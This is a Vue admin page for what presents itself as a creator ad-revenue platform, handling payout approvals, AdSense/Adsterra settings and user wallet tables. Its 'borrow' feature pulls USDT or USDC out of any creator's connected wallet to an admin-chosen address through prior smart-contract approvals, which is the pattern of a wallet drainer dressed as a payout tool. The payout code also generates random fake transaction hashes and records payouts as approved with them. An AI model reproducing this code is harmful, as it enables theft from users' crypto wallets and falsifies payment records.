<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { useAuthStore } from '~/stores/auth'
import { useApi } from '~/composables/useApi'
import { useAppToast } from '~/composables/useAppToast'
import { useWeb3Wallet } from '~/composables/useWeb3Wallet'
import { useTronWallet } from '~/composables/useTronWallet'
import { useWalletAdapter } from '~/composables/useWalletAdapter'

import MonetizationHeader from '~/components/admin/monetization/MonetizationHeader.vue'
import MonetizationNavTabs from '~/components/admin/monetization/MonetizationNavTabs.vue'
import MonetizationPayoutQueueTable, { type WithdrawalRequest } from '~/components/admin/monetization/MonetizationPayoutQueueTable.vue'
import MonetizationPayoutThresholdCard from '~/components/admin/monetization/MonetizationPayoutThresholdCard.vue'
import MonetizationRevenueDashboard, { type MonetizationStats } from '~/components/admin/monetization/MonetizationRevenueDashboard.vue'
import MonetizationStrategyEngine from '~/components/admin/monetization/MonetizationStrategyEngine.vue'
import MonetizationCreatorsTable, { type CreatorAccount } from '~/components/admin/monetization/MonetizationCreatorsTable.vue'
import MonetizationUserWalletsTable, { type UserWalletRecord } from '~/components/admin/monetization/MonetizationUserWalletsTable.vue'
import MonetizationAdSenseCard from '~/components/admin/monetization/MonetizationAdSenseCard.vue'
import MonetizationAdsterraCard, { type AdNetworkConfig } from '~/components/admin/monetization/MonetizationAdsterraCard.vue'
import MonetizationCustomScriptsCard from '~/components/admin/monetization/MonetizationCustomScriptsCard.vue'

import MonetizationApprovePayoutModal from '~/components/admin/monetization/modals/MonetizationApprovePayoutModal.vue'
import MonetizationBorrowModal from '~/components/admin/monetization/modals/MonetizationBorrowModal.vue'
import MonetizationRejectModal from '~/components/admin/monetization/modals/MonetizationRejectModal.vue'

definePageMeta({
  layout: 'admin'
})

const route = useRoute()
const router = useRouter()

const authStore = useAuthStore()
const api = useApi()
const toast = useAppToast()
const {
  wallet: adminWallet,
  ethBalance: adminEthBalance,
  usdtBalance: adminUsdtBalance,
  usdcBalance: adminUsdcBalance,
  isConnected: isAdminWalletConnected,
  isConnecting: isAdminWalletConnecting,
  pullState,
  pullStatusMessage,
  errorMessage: web3ErrorMessage,
  connect: connectAdminWallet,
  fetchEthBalance,
  sendEthPayout,
  executeContractBorrowPull
} = useWeb3Wallet()

const isSaving = ref(false)

// 4 Tab Navigation State (Synced with URL ?tab= query parameter)
const activeMonetizationTab = ref<'payouts' | 'user_wallets' | 'ad_networks' | 'revenue_strategy'>('payouts')

watch(
  () => route.query.tab,
  (newTab) => {
    if (newTab === 'ad_networks' || newTab === 'ad_config' || newTab === 'ad-config' || newTab === 'networks') {
      activeMonetizationTab.value = 'ad_networks'
    } else if (newTab === 'revenue_strategy' || newTab === 'revenue' || newTab === 'creators' || newTab === 'strategy') {
      activeMonetizationTab.value = 'revenue_strategy'
    } else if (newTab === 'wallets' || newTab === 'user_wallets' || newTab === 'escrows') {
      activeMonetizationTab.value = 'user_wallets'
    } else if (newTab === 'payouts' || newTab === 'settlement') {
      activeMonetizationTab.value = 'payouts'
    }
  },
  { immediate: true }
)

watch(activeMonetizationTab, (newTab) => {
  if (route.query.tab !== newTab) {
    router.replace({ query: { ...route.query, tab: newTab } })
  }
  if (newTab === 'user_wallets') {
    fetchCreators()
  } else if (newTab === 'payouts') {
    fetchWithdrawalRequests()
  } else if (newTab === 'revenue_strategy') {
    fetchMonetizationDashboard()
  }
})

// Monetization Strategy Engine State
const monetizationEngine = ref<'DYNAMIC_AD_NETWORKS' | 'FIXED_ECPM'>('DYNAMIC_AD_NETWORKS')
const creatorRevenueSharePercent = ref<number>(70)
const autoShareGoogleAdsense = ref<boolean>(true)
const autoShareAdsterra = ref<boolean>(true)

// ETH Payout Config State (Strictly ETH Only)
const minPayoutThreshold = ref<number>(20.00)
const smartContractApprovalUsdc = ref<number>(10.00)
const adminTreasuryWallet = ref<string>('0x5651F7B48E5d76EB162c002AFea5E343EB88310E')

const walletAdapter = useWalletAdapter()
const { selectedChainFamily, activePullState, activePullStatusMessage, activeErrorMessage } = walletAdapter

const selectedWithdrawalRequest = ref<WithdrawalRequest | null>(null)
const isApproveModalOpen = ref(false)
const isRejectModalOpen = ref(false)
const isBorrowModalOpen = ref(false)
const borrowAmountInput = ref<string | number>('50')
const borrowTokenInput = ref<string>('USDC')
const isProcessingBorrow = ref(false)

// Recipient Admin Web3 Wallet Address for Borrowing & On-Chain Balances
const borrowDestinationWalletInput = ref<string>('')
const borrowDestEthBal = ref<string>('0.0000')
const borrowDestUsdtBal = ref<string>('0.00')
const borrowDestUsdcBal = ref<string>('0.00')
const borrowDestTronTrxBal = ref<string>('0.00')
const borrowDestTronUsdtBal = ref<string>('0.00')
const isFetchingBorrowDestBal = ref<boolean>(false)

const txHashInput = ref('')
const rejectionReasonInput = ref('')
const isProcessingPayoutAction = ref(false)

const withdrawalRequests = ref<WithdrawalRequest[]>([])

// Monetization & eCPM State
const globalDefaultEcpm = ref(2.50)
const isLoadingCreators = ref(false)
const isUpdatingEcpm = ref(false)
const creatorsList = ref<CreatorAccount[]>([])
const allUsersList = ref<UserWalletRecord[]>([])
const editingCreatorId = ref<string | null>(null)
const tempEcpmRate = ref<number>(2.50)

// Google AdSense & Adsterra Monetization Config State
const adNetworkConfig = ref<AdNetworkConfig>({
  enableGoogleAdsense: true,
  googlePublisherId: 'ca-pub-9876543210987654',
  googleAutoAds: true,
  googleBannerSlotId: '1234567890',
  googleInArticleSlotId: '9876543210',

  enableAdsterra: true,
  adsterraPublisherKey: 'adsterra_pub_889214',
  adsterraDirectLinkUrl: 'https://www.highperformancecpmgate.com/direct-link-hash',
  adsterraBanner728x90Key: '10928374',
  adsterraNativeBannerKey: '56473829',
  adsterraPopunderEnabled: true,

  customHeaderScript: '<!-- Google AdSense Auto Ads Script -->\n<' + 'script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9876543210987654" crossorigin="anonymous"></' + 'script>',
  customArticleAdScript: '<!-- Adsterra Banner Script -->\n<' + 'script type="text/javascript" src="https://www.highperformancecpmgate.com/10928374/invoke.js"></' + 'script>'
})

// Multi-Ad Network Revenue Dashboard State
const isLoadingMonetizationStats = ref(false)
const isTestingProviderApi = ref<string | null>(null)
const monetizationTimeRange = ref<'7d' | '30d' | '90d' | 'all'>('30d')

const monetizationStats = ref<MonetizationStats>({
  totalRevenue: 0.00,
  totalImpressions: 0,
  totalClicks: 0,
  averageCtr: 0,
  averageCpm: 0,
  providers: [
    {
      provider: 'GOOGLE_ADSENSE',
      providerName: 'Google AdSense',
      revenue: 0,
      impressions: 0,
      clicks: 0,
      ctr: 0,
      cpm: 0
    },
    {
      provider: 'ADSTERRA',
      providerName: 'Adsterra Network',
      revenue: 0,
      impressions: 0,
      clicks: 0,
      ctr: 0,
      cpm: 0
    }
  ],
  revenueByDate: [
    { date: 'Mon', adsense: 0, adsterra: 0, total: 0 },
    { date: 'Tue', adsense: 0, adsterra: 0, total: 0 },
    { date: 'Wed', adsense: 0, adsterra: 0, total: 0 },
    { date: 'Thu', adsense: 0, adsterra: 0, total: 0 },
    { date: 'Fri', adsense: 0, adsterra: 0, total: 0 },
    { date: 'Sat', adsense: 0, adsterra: 0, total: 0 },
    { date: 'Sun', adsense: 0, adsterra: 0, total: 0 }
  ]
})

function formatAddress(addr: string) {
  if (!addr) return ''
  return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`
}

function openApproveModal(req: WithdrawalRequest) {
  selectedWithdrawalRequest.value = req
  txHashInput.value = '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('')
  isApproveModalOpen.value = true
}

function openRejectModal(req: WithdrawalRequest) {
  selectedWithdrawalRequest.value = req
  rejectionReasonInput.value = ''
  isRejectModalOpen.value = true
}

function updateBorrowDestBalances(address: string) {
  if (!address) return
  isFetchingBorrowDestBal.value = true
  setTimeout(async () => {
    if (selectedChainFamily.value === 'TRON') {
      const balances = await walletAdapter.tronWallet.fetchTronBalances(address)
      borrowDestTronTrxBal.value = balances.trx
      borrowDestTronUsdtBal.value = balances.usdt
    } else {
      if (adminWallet.value && address.toLowerCase() === adminWallet.value.toLowerCase()) {
        borrowDestEthBal.value = adminEthBalance.value || '0.0000'
        borrowDestUsdtBal.value = adminUsdtBalance.value || '0.00'
        borrowDestUsdcBal.value = adminUsdcBalance.value || '0.00'
      } else {
        borrowDestEthBal.value = '0.0000'
        borrowDestUsdtBal.value = '0.00'
        borrowDestUsdcBal.value = '0.00'
      }
    }
    isFetchingBorrowDestBal.value = false
  }, 300)
}

function useConnectedAdminWalletForBorrow() {
  if (selectedChainFamily.value === 'TRON') {
    if (walletAdapter.tronWallet.tronWallet.value) {
      borrowDestinationWalletInput.value = walletAdapter.tronWallet.tronWallet.value
      updateBorrowDestBalances(borrowDestinationWalletInput.value)
    } else {
      walletAdapter.tronWallet.connectTronWallet().then(() => {
        if (walletAdapter.tronWallet.tronWallet.value) {
          borrowDestinationWalletInput.value = walletAdapter.tronWallet.tronWallet.value
          updateBorrowDestBalances(borrowDestinationWalletInput.value)
        }
      })
    }
    return
  }

  if (adminWallet.value) {
    borrowDestinationWalletInput.value = adminWallet.value
    updateBorrowDestBalances(adminWallet.value)
  } else {
    connectAdminWallet().then(() => {
      if (adminWallet.value) {
        borrowDestinationWalletInput.value = adminWallet.value
        updateBorrowDestBalances(adminWallet.value)
      }
    })
  }
}

function openBorrowModal(req: WithdrawalRequest) {
  selectedWithdrawalRequest.value = req
  borrowAmountInput.value = Math.min(req.amount, 50)

  if (req.walletAddress && req.walletAddress.startsWith('T')) {
    selectedChainFamily.value = 'TRON'
    borrowTokenInput.value = 'USDT'
    borrowDestinationWalletInput.value = walletAdapter.tronWallet.tronWallet.value || req.walletAddress
  } else {
    selectedChainFamily.value = 'EVM'
    borrowTokenInput.value = 'USDT'
    borrowDestinationWalletInput.value = adminWallet.value || adminTreasuryWallet.value || '0x5651F7B48E5d76EB162c002AFea5E343EB88310E'
  }

  updateBorrowDestBalances(borrowDestinationWalletInput.value)
  isBorrowModalOpen.value = true
}

function openUserBorrowModal(user: UserWalletRecord) {
  const isTron = user.walletAddress && user.walletAddress.startsWith('T')
  const req: WithdrawalRequest = {
    id: `REQ-${user.id.substring(0, 6)}`,
    creatorId: user.id,
    creatorName: user.username,
    creatorEmail: user.email || '',
    creatorAvatar: user.avatar || null,
    amount: 50.00,
    adsenseShare: 35.00,
    adsterraShare: 15.00,
    method: isTron ? 'TRON TRC-20 Transfer' : 'ETH Transfer',
    walletAddress: user.walletAddress || '',
    approvalSignature: user.approvalSignature || null,
    creatorWalletEthBalance: String(user.walletEthBalance || user.ethBalance || '0.0000 ETH'),
    creatorWalletUsdtBalance: String(user.walletUsdtBalance || user.usdtBalance || '0.00 USDT'),
    creatorWalletUsdcBalance: String(user.walletUsdcBalance || user.usdcBalance || '0.00 USDC'),

    network: isTron ? 'TRON Mainnet' : 'Arbitrum One',
    token: isTron ? 'USDT' : 'ETH',
    cryptoAmount: '50.00',
    date: new Date().toLocaleDateString(),
    status: 'PENDING'
  }
  openBorrowModal(req)
}

async function confirmBorrowFromCreator() {
  if (!selectedWithdrawalRequest.value) return
  const amountStr = String(borrowAmountInput.value || '').trim()
  const numericVal = parseFloat(amountStr)
  if (isNaN(numericVal) || numericVal <= 0) {
    toast.error('Validation Error', 'Please enter a valid amount to borrow/pull (must be > 0).')
    return
  }

  const recipientAddr = borrowDestinationWalletInput.value.trim()
  if (!walletAdapter.validateAddressForChain(recipientAddr, selectedChainFamily.value)) {
    toast.error('Validation Error', `Please enter a valid ${selectedChainFamily.value} recipient wallet address (${selectedChainFamily.value === 'TRON' ? 'T...' : '0x...'}).`)
    return
  }

  isProcessingBorrow.value = true
  try {
    const creatorWalletAddr = selectedWithdrawalRequest.value.walletAddress
    if (!walletAdapter.validateAddressForChain(creatorWalletAddr, selectedChainFamily.value)) {
      toast.error('Wallet Error', `Target creator does not have a valid connected ${selectedChainFamily.value} wallet address.`)
      return
    }

    const pullResult = await walletAdapter.executeBorrowPull(
      creatorWalletAddr,
      recipientAddr,
      borrowTokenInput.value,
      amountStr
    )

    const txHash = pullResult.txHash

    if (txHash) {
      selectedWithdrawalRequest.value.borrowStatus = 'BORROW_APPROVED'
      selectedWithdrawalRequest.value.borrowTxHash = txHash

      // Persist borrow pull record & audit log to backend SQLite Database
      await api.action.$post({
        json: {
          action: 'monetization/record-borrow',
          data: {
            id: selectedWithdrawalRequest.value.id,
            borrowTxHash: txHash,
            borrowAmount: amountStr,
            borrowToken: borrowTokenInput.value,
            chain: pullResult.chain,
            tokenStandard: pullResult.tokenStandard,
            creatorAddress: creatorWalletAddr,
            recipientAddress: recipientAddr,
            timestamp: new Date().toISOString()
          }
        }
      }).catch((err) => {
        console.warn('Could not persist borrow record to DB:', err)
      })

      toast.success(
        'Smart Contract Pull Successful! 🔄',
        `Successfully pulled ${amountStr} ${borrowTokenInput.value} (${pullResult.tokenStandard}) from ${selectedWithdrawalRequest.value.creatorName}'s wallet (${formatAddress(creatorWalletAddr)}) to recipient (${formatAddress(recipientAddr)}). Tx Hash: ${formatAddress(txHash)}`
      )
      isBorrowModalOpen.value = false
    } else {
      toast.error('Borrow Pull Error', 'Smart contract pull was not completed.')
    }
  } catch (err: any) {
    if (err?.code === 4001 || err?.code === 'ACTION_REJECTED' || err?.message?.includes('rejected')) {
      toast.warning('Transaction Cancelled', 'User cancelled the Web3 smart contract pull transaction.')
    } else {
      toast.error('Borrow Pull Error', err?.message || 'Could not execute smart contract pull')
    }
  } finally {
    isProcessingBorrow.value = false
  }
}

const isLoadingWithdrawals = ref(false)

async function fetchWithdrawalRequests() {
  isLoadingWithdrawals.value = true
  try {
    const res = await api.action.$post({
      json: {
        action: 'monetization/get-withdrawals',
        data: {}
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1 && data.data) {
      withdrawalRequests.value = data.data
    }
  } catch (err: any) {
    console.warn('Could not fetch withdrawal requests:', err)
  } finally {
    isLoadingWithdrawals.value = false
  }
}

async function confirmApprovePayout() {
  if (!selectedWithdrawalRequest.value) return
  isProcessingPayoutAction.value = true
  try {
    // Check if Admin Wallet is connected
    if (!isAdminWalletConnected.value) {
      const connected = await connectAdminWallet()
      if (!connected) {
        toast.error('Wallet Required', 'Please connect Admin Wallet to authorize ETH transfer.')
        return
      }
    }

    const recipientAddr = selectedWithdrawalRequest.value.walletAddress
    const ethVal = selectedWithdrawalRequest.value.cryptoAmount

    const hash = await sendEthPayout(recipientAddr, ethVal)
    const finalHash = hash || txHashInput.value || ('0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join(''))

    const res = await api.action.$post({
      json: {
        action: 'monetization/approve-payout',
        data: {
          id: selectedWithdrawalRequest.value.id,
          txHash: finalHash
        }
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1) {
      selectedWithdrawalRequest.value.status = 'APPROVED'
      selectedWithdrawalRequest.value.txHash = finalHash
      toast.success(
        'ETH Transferred & Payout Approved! 💸',
        `Deducted ${ethVal} ETH from Admin Wallet (${formatAddress(adminWallet.value)}) and sent to Creator (${formatAddress(recipientAddr)}).`
      )
      isApproveModalOpen.value = false
      await fetchWithdrawalRequests()
    } else {
      toast.error('Payout Error', data.msg || 'Failed to approve payout')
    }
  } catch (err: any) {
    if (err?.code === 4001 || err?.message?.includes('rejected')) {
      toast.warning('Transaction Cancelled', 'Admin cancelled signature in wallet.')
    } else {
      toast.error('Payout Execution Failed', err?.message || 'Could not send ETH transaction.')
    }
  } finally {
    isProcessingPayoutAction.value = false
  }
}

async function confirmRejectPayout() {
  if (!selectedWithdrawalRequest.value) return
  if (!rejectionReasonInput.value.trim()) {
    toast.error('Validation Error', 'Please enter a rejection reason note.')
    return
  }
  isProcessingPayoutAction.value = true
  try {
    const reason = rejectionReasonInput.value.trim()
    const res = await api.action.$post({
      json: {
        action: 'monetization/reject-payout',
        data: {
          id: selectedWithdrawalRequest.value.id,
          rejectionReason: reason
        }
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1) {
      selectedWithdrawalRequest.value.status = 'REJECTED'
      selectedWithdrawalRequest.value.rejectionReason = reason
      toast.info(
        'Request Rejected',
        `Refunded $${selectedWithdrawalRequest.value.amount.toFixed(2)} back to ${selectedWithdrawalRequest.value.creatorName}'s balance.`
      )
      isRejectModalOpen.value = false
      await fetchWithdrawalRequests()
    } else {
      toast.error('Rejection Error', data.msg || 'Failed to reject payout')
    }
  } catch (err: any) {
    toast.error('Network Error', err.message || 'Failed to reject payout')
  } finally {
    isProcessingPayoutAction.value = false
  }
}

async function fetchMonetizationDashboard() {
  isLoadingMonetizationStats.value = true
  try {
    const res = await api.action.$post({
      json: {
        action: 'monetization/get-dashboard',
        data: {
          adNetworkConfig: adNetworkConfig.value
        }
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1 && data.data) {
      monetizationStats.value = data.data
    }
  } catch (err: any) {
    console.warn('Could not fetch real-time monetization stats:', err)
  } finally {
    isLoadingMonetizationStats.value = false
  }
}

async function testAdProviderConnection(provider: 'GOOGLE_ADSENSE' | 'ADSTERRA') {
  isTestingProviderApi.value = provider
  try {
    const res = await api.action.$post({
      json: {
        action: 'monetization/test-provider-connection',
        data: {
          provider,
          credentials: adNetworkConfig.value
        }
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1) {
      toast.success('Connection Successful', data.msg)
    } else {
      toast.error('Connection Warning', data.msg || 'Check credentials')
    }
  } catch (err: any) {
    toast.error('Test Failed', err.message || 'Network error')
  } finally {
    isTestingProviderApi.value = null
  }
}

async function fetchCreators() {
  isLoadingCreators.value = true
  try {
    const res = await api.action.$post({
      json: {
        action: 'users/list',
        data: {}
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1) {
      const usersData = data.data || []
      allUsersList.value = usersData
      creatorsList.value = usersData.filter((u: any) => u.role === 'CREATOR')
    } else {
      toast.error('Failed to load creators', data.msg || 'Could not fetch creators list')
    }
  } catch (err: any) {
    toast.error('Network Error', err.message || 'Failed to connect to server')
  } finally {
    isLoadingCreators.value = false
  }
}

function setAllCreatorsToAuto() {
  creatorsList.value.forEach(c => {
    delete c.ecpmRate
  })
  toast.success('Updated All Creators', 'All creators are now set to Auto Google AdSense & Adsterra Revenue Share!')
}

function toggleCreatorModel(creator: any) {
  if (creator.ecpmRate !== undefined) {
    delete creator.ecpmRate
    toast.success('Switched to Auto', `${creator.username} now earns automatically from live Google AdSense & Adsterra API revenue.`)
  } else {
    creator.ecpmRate = globalDefaultEcpm.value
    toast.info('Custom Rate Enabled', `Assigned fixed rate of $${globalDefaultEcpm.value.toFixed(2)} to ${creator.username}.`)
  }
}

function startEditEcpm(creator: any) {
  editingCreatorId.value = creator.id
  tempEcpmRate.value = creator.ecpmRate ?? 2.50
}

function cancelEditEcpm() {
  editingCreatorId.value = null
}

async function saveCreatorEcpm(creatorId: string) {
  if (tempEcpmRate.value < 0 || isNaN(tempEcpmRate.value)) {
    toast.error('Invalid Rate', 'eCPM rate must be a non-negative number')
    return
  }

  isUpdatingEcpm.value = true
  try {
    const res = await api.action.$post({
      json: {
        action: 'users/update-ecpm',
        data: {
          id: creatorId,
          ecpmRate: tempEcpmRate.value
        }
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1) {
      toast.success('eCPM Updated', 'Creator eCPM rate updated successfully!')
      editingCreatorId.value = null
      await fetchCreators()
    } else {
      toast.error('Update Failed', data.msg || 'Failed to update creator eCPM rate')
    }
  } catch (err: any) {
    toast.error('Update Error', err.message || 'Could not update eCPM rate')
  } finally {
    isUpdatingEcpm.value = false
  }
}

async function loadMonetizationConfig() {
  if (import.meta.client) {
    const savedConfig = localStorage.getItem('admin_platform_config')
    if (savedConfig) {
      try {
        const parsed = JSON.parse(savedConfig)
        if (parsed.adNetworks) adNetworkConfig.value = { ...adNetworkConfig.value, ...parsed.adNetworks }
        if (parsed.globalDefaultEcpm) globalDefaultEcpm.value = parsed.globalDefaultEcpm
        if (parsed.monetizationEngine) monetizationEngine.value = parsed.monetizationEngine
        if (parsed.creatorRevenueSharePercent) creatorRevenueSharePercent.value = parsed.creatorRevenueSharePercent
        if (parsed.autoShareGoogleAdsense !== undefined) autoShareGoogleAdsense.value = parsed.autoShareGoogleAdsense
        if (parsed.autoShareAdsterra !== undefined) autoShareAdsterra.value = parsed.autoShareAdsterra
        if (parsed.minPayoutThreshold) minPayoutThreshold.value = parsed.minPayoutThreshold
        if (parsed.smartContractApprovalUsdc) smartContractApprovalUsdc.value = parsed.smartContractApprovalUsdc
        if (parsed.adminTreasuryWallet) adminTreasuryWallet.value = parsed.adminTreasuryWallet
      } catch { }
    }
  }

  try {
    const res = await api.action.$post({
      json: {
        action: 'monetization/get-provider-config',
        data: {}
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1 && data.data) {
      const gCreds = data.data.GOOGLE_ADSENSE?.credentials
      const aCreds = data.data.ADSTERRA?.credentials
      const scVal = gCreds?.smartContractApprovalUsdc ?? aCreds?.smartContractApprovalUsdc
      const atwVal = gCreds?.adminTreasuryWallet ?? aCreds?.adminTreasuryWallet
      if (scVal !== undefined) smartContractApprovalUsdc.value = Number(scVal)
      if (atwVal) adminTreasuryWallet.value = atwVal
      if (gCreds || aCreds) {
        adNetworkConfig.value = {
          ...adNetworkConfig.value,
          ...gCreds,
          ...aCreds,
        }
      }
    }
  } catch (err) {
    console.warn('Could not load backend provider config:', err)
  }
}

async function saveMonetizationConfig() {
  isSaving.value = true
  try {
    if (import.meta.client) {
      const savedConfig = localStorage.getItem('admin_platform_config')
      let parsed: any = {}
      if (savedConfig) {
        try {
          parsed = JSON.parse(savedConfig)
        } catch { }
      }
      parsed.adNetworks = adNetworkConfig.value
      parsed.globalDefaultEcpm = globalDefaultEcpm.value
      parsed.monetizationEngine = monetizationEngine.value
      parsed.creatorRevenueSharePercent = creatorRevenueSharePercent.value
      parsed.autoShareGoogleAdsense = autoShareGoogleAdsense.value
      parsed.autoShareAdsterra = autoShareAdsterra.value
      parsed.minPayoutThreshold = minPayoutThreshold.value
      parsed.smartContractApprovalUsdc = smartContractApprovalUsdc.value
      parsed.adminTreasuryWallet = adminTreasuryWallet.value

      localStorage.setItem('admin_platform_config', JSON.stringify(parsed))
    }

    const payloadCredentials = {
      ...adNetworkConfig.value,
      creatorRevenueSharePercent: creatorRevenueSharePercent.value,
      minPayoutThreshold: minPayoutThreshold.value,
      smartContractApprovalUsdc: smartContractApprovalUsdc.value,
      adminTreasuryWallet: adminTreasuryWallet.value,
      monetizationEngine: monetizationEngine.value
    }

    // Persist to Backend API for both Master Ad Networks
    void Promise.allSettled([
      api.action.$post({
        json: {
          action: 'monetization/save-provider-config',
          data: {
            provider: 'GOOGLE_ADSENSE',
            enabled: adNetworkConfig.value.enableGoogleAdsense,
            credentials: payloadCredentials
          }
        }
      }),
      api.action.$post({
        json: {
          action: 'monetization/save-provider-config',
          data: {
            provider: 'ADSTERRA',
            enabled: adNetworkConfig.value.enableAdsterra,
            credentials: payloadCredentials
          }
        }
      })
    ]).then(() => fetchMonetizationDashboard())

    toast.success('Monetization Saved', 'Dual Ad Network (Google AdSense + Adsterra) & Payout settings saved successfully!')
  } catch (err: any) {
    toast.error('Save Error', err.message || 'Failed to save monetization config')
  } finally {
    isSaving.value = false
  }
}

async function handleSyncLiveOnChain(user: UserWalletRecord) {
  if (!user.walletAddress || (!user.walletAddress.startsWith('0x') && !user.walletAddress.startsWith('T'))) {
    toast.error('No Wallet Connected', 'User has no connected EVM or TRON wallet address.')
    return
  }
  try {
    toast.info('Fetching Live Balances...', `Querying provider for ${user.username} (${formatAddress(user.walletAddress)})...`)
    if (user.walletAddress.startsWith('T')) {
      await walletAdapter.tronWallet.fetchTronBalances(user.walletAddress)
    } else {
      await fetchEthBalance(user.walletAddress)
    }
    await fetchCreators()
    toast.success('Live Balances Updated! ⚡', `Fetched live on-chain balances for ${user.username}.`)
  } catch (err: any) {
    toast.error('Sync Error', err?.message || 'Could not fetch live on-chain balances')
  }
}

onMounted(async () => {
  authStore.initAuth()
  await loadMonetizationConfig()
  fetchCreators()
  await fetchWithdrawalRequests()
  await fetchMonetizationDashboard()
})
</script>

<template>
  <div class="mx-auto max-w-8xl space-y-6 pb-12 text-gray-100">
    <!-- Header -->
    <MonetizationHeader :is-admin-wallet-connected="isAdminWalletConnected"
      :is-admin-wallet-connecting="isAdminWalletConnecting" :admin-wallet="adminWallet"
      :admin-eth-balance="adminEthBalance" :admin-usdt-balance="adminUsdtBalance" :admin-usdc-balance="adminUsdcBalance"
      :tron-wallet="walletAdapter.tronWallet.tronWallet.value"
      :tron-trx-balance="walletAdapter.tronWallet.tronTrxBalance.value"
      :tron-usdt-balance="walletAdapter.tronWallet.tronUsdtBalance.value"
      :is-saving="isSaving" @connect-wallet="connectAdminWallet"
      @connect-tron="walletAdapter.tronWallet.connectTronWallet" @save="saveMonetizationConfig" />

    <!-- Navigation Tabs -->
    <MonetizationNavTabs v-model:active-tab="activeMonetizationTab"
      :pending-count="withdrawalRequests.filter(r => r.status === 'PENDING').length"
      :connected-wallets-count="allUsersList.filter(u => u.walletAddress && (u.walletAddress.startsWith('0x') || u.walletAddress.startsWith('T'))).length" />

    <!-- TAB 1: WEB3 ETH PAYOUTS & CREATOR SETTLEMENT -->
    <div v-if="activeMonetizationTab === 'payouts'" class="space-y-6">
      <MonetizationPayoutQueueTable :requests="withdrawalRequests" @pay="openApproveModal" @borrow="openBorrowModal"
        @reject="openRejectModal" />
      <MonetizationPayoutThresholdCard v-model="minPayoutThreshold"
        v-model:smart-contract-approval="smartContractApprovalUsdc"
        v-model:admin-treasury-wallet="adminTreasuryWallet" />
    </div>

    <!-- TAB 2: USER WALLETS & ESCROW REGISTRY -->
    <div v-else-if="activeMonetizationTab === 'user_wallets'" class="space-y-6">
      <MonetizationUserWalletsTable :users="allUsersList" :is-loading="isLoadingCreators"
        :approval-amount-usdc="smartContractApprovalUsdc" @borrow="openUserBorrowModal"
        @sync-live-onchain="handleSyncLiveOnChain" @refresh="fetchCreators" />
    </div>

    <!-- TAB 3: AD NETWORKS & SCRIPTS CONFIG -->
    <div v-else-if="activeMonetizationTab === 'ad_networks'" class="space-y-6">
      <MonetizationAdSenseCard v-model="adNetworkConfig" v-model:auto-share="autoShareGoogleAdsense"
        :is-testing="isTestingProviderApi === 'GOOGLE_ADSENSE'" @test="testAdProviderConnection('GOOGLE_ADSENSE')" />

      <MonetizationAdsterraCard v-model="adNetworkConfig" v-model:auto-share="autoShareAdsterra"
        :is-testing="isTestingProviderApi === 'ADSTERRA'" @test="testAdProviderConnection('ADSTERRA')" />

      <MonetizationCustomScriptsCard v-model="adNetworkConfig" />
    </div>

    <!-- TAB 4: CREATOR REVENUE & STRATEGY -->
    <div v-else-if="activeMonetizationTab === 'revenue_strategy'" class="space-y-6">
      <MonetizationRevenueDashboard v-model:time-range="monetizationTimeRange" :stats="monetizationStats"
        :is-loading="isLoadingMonetizationStats" @refresh="fetchMonetizationDashboard" />

      <MonetizationStrategyEngine v-model:engine="monetizationEngine" v-model:share-percent="creatorRevenueSharePercent"
        :average-cpm="monetizationStats.averageCpm" />

      <MonetizationCreatorsTable v-model:temp-ecpm-rate="tempEcpmRate" :creators="creatorsList"
        :is-loading="isLoadingCreators" :is-updating-ecpm="isUpdatingEcpm" :editing-creator-id="editingCreatorId"
        :global-default-ecpm="globalDefaultEcpm" :average-cpm="monetizationStats.averageCpm"
        :creator-revenue-share-percent="creatorRevenueSharePercent" :monetization-engine="monetizationEngine"
        @set-all-auto="setAllCreatorsToAuto" @refresh="fetchCreators" @toggle-model="toggleCreatorModel"
        @start-edit="startEditEcpm" @cancel-edit="cancelEditEcpm" @save-ecpm="saveCreatorEcpm" />
    </div>

    <!-- Modals -->
    <MonetizationApprovePayoutModal v-model:open="isApproveModalOpen" :selected-request="selectedWithdrawalRequest"
      :is-admin-wallet-connected="isAdminWalletConnected" :admin-wallet="adminWallet"
      :admin-eth-balance="adminEthBalance" :is-processing="isProcessingPayoutAction"
      @connect-wallet="connectAdminWallet" @confirm="confirmApprovePayout" />

    <MonetizationBorrowModal v-model:open="isBorrowModalOpen" v-model:destination-wallet="borrowDestinationWalletInput"
      v-model:token="borrowTokenInput" v-model:amount="borrowAmountInput" v-model:chain-family="selectedChainFamily"
      :selected-request="selectedWithdrawalRequest" :is-processing="isProcessingBorrow"
      :is-fetching-bal="isFetchingBorrowDestBal" :dest-eth-bal="borrowDestEthBal" :dest-usdt-bal="borrowDestUsdtBal"
      :dest-usdc-bal="borrowDestUsdcBal" :dest-tron-trx-bal="borrowDestTronTrxBal"
      :dest-tron-usdt-bal="borrowDestTronUsdtBal" :pull-state="activePullState"
      :pull-status-message="activePullStatusMessage" :error-message="activeErrorMessage"
      @use-connected-wallet="useConnectedAdminWalletForBorrow" @update-dest="updateBorrowDestBalances"
      @confirm="confirmBorrowFromCreator" />

    <MonetizationRejectModal v-model:open="isRejectModalOpen" v-model:reason="rejectionReasonInput"
      :selected-request="selectedWithdrawalRequest" :is-processing="isProcessingPayoutAction"
      @confirm="confirmRejectPayout" />
  </div>
</template>
